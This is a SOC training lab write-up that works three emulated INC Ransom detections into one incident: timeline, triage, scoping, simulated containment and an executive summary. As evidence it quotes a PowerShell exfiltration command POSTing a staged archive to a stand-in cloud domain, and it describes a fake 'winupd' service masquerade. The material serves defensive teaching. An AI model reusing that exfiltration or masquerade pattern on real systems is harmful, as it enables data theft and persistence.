# Lab 05 - Capstone: Working the INC Ransom Chain as One Incident

## Objective
Work the three detections from Labs 02-04 as a single INC Ransom incident: triage
each alert, build the timeline, scope the incident, contain it, and write the report.
This is a **paper walkthrough**. There is no new rule and no new live fire, because
DC01 and the endpoint cannot run alongside the manager at the same time (see README).
Its value is the IR reasoning built on evidence the earlier labs already produced.

## Framing
| Field | Value |
|---|---|
| Discipline | Incident response: analysis, scoping, containment, reporting |
| Phase model | NIST SP 800-61r2 (fixed in Lab 01) |
| Inputs | Evidence records 100900 (Lab 02), 100901 (Lab 03), 100412 (Lab 04) |
| Clock | Collector `timestamp`, UTC (Lab 01 decision 1); agent local time is noted only as skew |
| ATT&CK | v19 (Lab 01 decision 4) |
| Rule produced | None |

## The honesty boundary (read first)
The three alerts came from **three separate emulations**, not one intrusion:
- They fired **out of INC's order**: deployment, then exfiltration, then RDP. INC
  works RDP, then deployment, then exfiltration.
- They span **two hosts**: the endpoint (agent 002) and DC01 (agent 004).
- The RDP source was the **lab host** (`192.168.56.1`), not agent 002. **No evidence
  links the RDP actor to the compromised endpoint.**

So this lab keeps two layers apart:
- **Section 1** is what the SIEM actually recorded.
- **Section 3** is a labelled reconstruction of how the same alerts would read in a
  real INC intrusion.

Every reconstructed step cites the evidence row it rests on. Every link the evidence
does not show is marked **ASSUMED**, together with the evidence that would prove it.

## 1. Evidence timeline - as fired
| # | UTC (collector) | Host / agent | Event | Rule (level) | ATT&CK (v19) | Source lab |
|---|---|---|---|---|---|---|
| E1 | 2026-09-30 20:44:00 | windows / 002 | 7045 service install `winupd`, imagePath `C:\Windows\winupd.exe` | 100900 (L12) | T1543.003, T1569.002 | Lab 02 |
| E2 | 2026-10-01 15:37:32 | windows / 002 | 4104 `Invoke-WebRequest -Method POST -InFile C:\Loot\loot.zip` to `mega-sync-backup.example` | 100901 (L13) | T1048, T1537 | Lab 03 |
| E3 | 2026-10-01 20:03:38 | DC01.lab.local / 004 | 4624 LogonType 10, targetUserSid `...-500` (built-in Administrator), from `192.168.56.1` | 100412 (L12) | T1021.001, T1078.002 | Lab 04 |

Corroborating telemetry recorded by the source labs (not separately alerting):
- **E1:** 61138 (L5) fired alongside. Shipped 92650 (L12) stayed silent because of the
  path-representation evasion.
- **Before E2 (staging):** `Compress-Archive` hit only 67027 (L3) and 92027 (L4).
- **E2:** Sysmon EID1 (process create), EID11 (`loot.zip` written), EID22 (DNS lookup
  of the cloud domain), and Security 4688.

Gaps visible in the evidence:
- **Account.** The E1 and E2 records do not capture the acting account. Only E3 names
  one: the built-in Administrator.
- **Clock skew.** NTP is off, so agent time runs about 4h off the collector. Rows are
  ordered by collector time only.
- **Blind spots.** Staging (T1560) and the DNS lookup (EID22) reached no meaningful
  alert (Lab 03).
- **Missed sibling event.** A second 4624 in the same RDP connection, with a blank
  `ipAddress`, evaded the 100412 chain (Lab 04).
- **No completed exfiltration.** The upload in E2 failed because the destination is
  unresolvable. No data left the lab.

## 2. Triage - one verdict per alert
In the lab, all three are known-true emulations. The verdicts below are the
**scenario** verdicts: what an analyst would conclude from these fields in a real
estate, and what would overturn each one.

| Alert | Verdict | Why (field-level) | What would make it a false positive |
|---|---|---|---|
| E1 / 100900 | **True positive** | Service binary sits directly in the Windows root (`C:\Windows\winupd.exe`). The name imitates Windows Update, but the real update service is `wuauserv`, not `winupd`. Not a product seen in the endpoint's 7045 baseline (Brother, Bitdefender). | A signed vendor binary and a matching change or deployment record. In the lab the binary is a copy of `cmd.exe`, so a hash or signature check would expose the masquerade. |
| E2 / 100901 | **True positive (attempted exfiltration)** | `-InFile` + `-Method POST` sends a file out. The file is an archive just written (EID11) from staged `customer_*.txt` files. The destination is an unknown external domain. | A sanctioned backup or sync script, from a known script path, posting to an approved destination. |
| E3 / 100412 | **True positive pending owner confirmation** | Built-in Administrator (RID 500) used interactively over RDP to a domain controller. Mature estates avoid this account. Source `192.168.56.1` is not a designated jump host. | The source is the sanctioned admin jump host, a named administrator confirms the session, and it falls in a change window. This is the documented tripwire false positive (Lab 04). |

E3 cannot be closed from the SIEM alone. That account is legitimately usable, so
the verdict depends on a human confirming the session. Until then, it is worked as
a true positive.

## 3. Reconstructed incident timeline - INC order (labelled reconstruction)
Relative steps, not timestamps. The real times are in Section 1 and do not follow
this order.

| Step | NIST phase | Reconstructed activity | Based on | Assumed link? (what would prove it) | Analyst action |
|---|---|---|---|---|---|
| T0 | Detection & Analysis | Attacker with the built-in Administrator credential RDPs to DC01 from a foothold host | E3 | **ASSUMED:** that the foothold is endpoint 002 (E3's actual source is `192.168.56.1`). Proof: 4624 on DC01 sourced from 002's IP, or the same account logging on to 002 | Confirm the session with the account owner; pivot on the source IP across all agents |
| T1 | Detection & Analysis | Payload registered as service `winupd` on endpoint 002 | E1 | **ASSUMED:** that the same actor/credential did it (E1 records no account). Proof: a 4624 type 3 or type 10 on 002 by the built-in Administrator just before the 7045, or Security 4697 naming the installing account | Pivot on `serviceName winupd` across all agents to answer "one host or many" |
| T2 | Detection & Analysis | Files collected to `C:\Loot` and compressed to `loot.zip` | Lab 03 corroborating EID11 / 4688 (no alert) | Staging links to T3 through the same file path (`C:\Loot\loot.zip`). That link is in the evidence, not assumed | Note the detection gap: T1560 produced no actionable alert |
| T3 | Detection & Analysis, then Containment | `loot.zip` POSTed to cloud-style domain `mega-sync-backup.example` | E2 | None. E2 names the file and destination directly. The transfer **failed** | Trigger containment (Section 5); establish whether any bytes left |
| T4 | (Not reached) | Encryption | None (not emulated) | Out of scope by design (README boundaries) | The chain was cut before this step. The pre-encryption window is the point of the module |

## 4. Scope
- **Hosts.**
  - Confirmed: endpoint 002 (E1, E2) and DC01 (E3).
  - To find others: pivot on `serviceName = winupd` across all agents (Lab 02), and
    on 4624 events sourced from `192.168.56.1` (Lab 04).
  - Not executed in this paper walkthrough.
- **Accounts.**
  - Confirmed: the built-in Administrator (E3).
  - E1 and E2 accounts are **unknown from the alert records**. They would come from
    4688 `SubjectUserName`, the Sysmon EID1 `User` field, or Security 4697.
  - Until that's established, assume the built-in Administrator credential is
    compromised domain-wide.
- **Data.**
  - What: `loot.zip`, five staged `customer_*.txt` files (junk in the lab).
  - Channel: HTTP POST.
  - Destination: `mega-sync-backup.example`.
  - When: E2, 2026-10-01 15:37:32 UTC.
  - **The transfer failed (unresolvable destination). No data left.** In a real case,
    proxy or firewall byte counts would be required before stating that, because
    host telemetry shows the attempt, not the outcome.
- **What this SIEM cannot scope:**
  - The DNS channel: no DNS rules, and `logall_json` off.
  - Staging (T1560).
  - RDP 4624s with a blank `ipAddress`.
  - `curl.exe`-based transfers, which are absent from the Sysmon include-list.
  - Any of these could hide additional hosts or destinations.

## 5. Containment, eradication, recovery
Every action here is **SIMULATED**: this is a paper walkthrough (Lab 01 decision 3).
The production action is stated.

| Order | Action | Why at this point | Real / simulated |
|---|---|---|---|
| 1 | Isolate endpoint 002 at the network layer | It is the host actively exfiltrating and running the deployed service. Data loss is the irreversible harm and, for a university, the reportable breach. Isolation stops further exfiltration and further spread from 002 | Simulated (lab equivalent: detach 002's host-only NIC, reversible) |
| 2 | Reset the built-in Administrator's password, disable it if a break-glass alternative exists, and terminate its sessions on DC01 | Isolating 002 does **not** stop the E3 actor: the RDP came from `192.168.56.1`, and the credential is live on a domain controller. Second rather than first because it carries a lockout risk for the domain, but it follows **immediately**. With two responders, 1 and 2 run in parallel | Simulated |
| 3 | Block `mega-sync-backup.example` at the egress proxy/firewall, then hunt egress logs for other upload destinations | Closes the known exfiltration route for any other host. Third because it only blocks one destination, and the attacker can switch | Simulated |
| 4 | Fleet sweep: `serviceName winupd` and 4624 from `192.168.56.1` across all agents; isolate any hit | Answers "one host or many" before eradication, so nothing is cleaned while a sibling host is still active | Simulated (queries defined, not run) |
| 5 | Eradicate: `sc delete winupd`, remove `C:\Windows\winupd.exe` and `C:\Loot`; reconnect 002; re-fire the stand-ins to prove 100900, 100901 and 100412 still alert | Lab 01's recovery definition: artefacts gone **and** detection still works | `winupd` removal was **real** (Lab 02 cleanup). `C:\Loot` removal is **pending verification** on the endpoint. Re-fire not done |

## 6. Detection lessons carried forward (ranked)
1. **Coverage on paper is not coverage.** Each link was "covered" before this module,
   and each failed differently when fired:
   - **Evasion:** shipped 92650 missed the expanded path (Lab 02).
   - **Misclassification:** 100405 labelled exfiltration as ingress (Lab 03).
   - **False gap:** the RDP "gap" was already covered by shipped 92653 (Lab 04).

   Only live fire tells these apart. A coverage map built on rule IDs would have been
   wrong three times.
2. **Missing account context is the biggest scoping obstacle.** Two of three alerts
   carry no acting account, so every cross-host link in Section 3 had to be marked
   ASSUMED. Enriching alerts with the acting user is the highest-value fix.
3. **Single-event rules cannot link a chain.** Joining E3 to E1 needs correlation on
   account or source across hosts. That is hunting work (Module 07), or entity-mapped
   incidents in Sentinel. Wazuh's stateless engine does not do it.
4. **Known blind spots on the INC path:**
   - staging (T1560)
   - DNS (EID22)
   - `curl.exe`
   - blank-`ipAddress` RDP
5. **100412 has no DC condition.** It escalates built-in Administrator RDP on any
   host. Either scope it to DCs or document it as fleet-wide (Lab 04).

## 7. Incident report - executive summary
*Lab emulation: no real systems, data, or attacker were involved.*

Between 30 September and 1 October 2026, the SOC detected three activities matching
the INC Ransom group's pre-encryption playbook:
- a disguised program installed as a Windows service on a staff endpoint;
- an attempt from that endpoint to upload a compressed archive of files to an
  external cloud-style site;
- a remote-desktop logon to a domain controller using the domain's built-in
  Administrator account.

The upload failed, and no data is known to have left. The response plan isolates the
endpoint first to stop data loss. It then immediately resets the Administrator
credential, blocks the upload destination, and checks every other machine for the
same program and logon source before cleanup. No encryption occurred.

Residual risk:
- The SOC cannot yet see DNS lookups, file staging, or some remote-desktop logons.
- Two of the three alerts lack the user account involved, which leaves the link
  between the endpoint activity and the domain-controller logon unproven.

Recommended next steps:
1. Add account context to alerts.
2. Close the DNS and staging gaps.
3. Restrict use of the built-in Administrator account.

## Result
- The three Module 09 detections were worked as one INC incident, with the evidence
  (Section 1) and the reconstruction (Section 3) kept apart. Every unproven link is
  marked ASSUMED, with the evidence that would prove it.
- The incident was contained in the pre-encryption window (simulated). Ordering:
  isolate the exfiltrating host, then the live privileged credential immediately
  after, with the reason for that order stated.
- The capstone finding is not a rule. **Live fire overturned the coverage map three
  ways** (evasion, misclassification, false gap), and missing account context is
  what stops this SIEM from proving the chain.

## Files
- Inputs: the Lab02, Lab03 and Lab04 evidence records in this module.
- No rule; no manager change.
